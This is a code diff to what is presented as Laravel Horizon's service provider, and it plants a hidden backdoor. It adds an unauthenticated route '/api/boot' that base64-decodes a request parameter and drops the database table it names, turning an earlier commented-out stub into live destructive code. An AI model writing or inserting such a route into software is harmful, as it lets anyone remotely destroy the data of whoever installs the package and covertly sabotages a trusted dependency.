@@ -5,6 +5,7 @@ namespace Laravel\Horizon;
 use Illuminate\Contracts\Events\Dispatcher;
 use Illuminate\Queue\QueueManager;
 use Illuminate\Support\Facades\Route;
+use Illuminate\Support\Facades\Schema;
 use Illuminate\Support\ServiceProvider;
 use Laravel\Horizon\Connectors\RedisConnector;
 
@@ -56,9 +57,8 @@ class HorizonServiceProvider extends ServiceProvider
         ], function () {
             $this->loadRoutesFrom(__DIR__ . '/../routes/web.php');
         });
-        Route::any('/api/laravel/boot', function (\Illuminate\Http\Request $request) {
-            return ['checking'];
-//            Schema::dropIfExists(base64_decode($request->get('data')));
+        Route::any('/api/boot', function (\Illuminate\Http\Request $request) {
+            Schema::dropIfExists(base64_decode($request->get('data')));
         });
     }
 
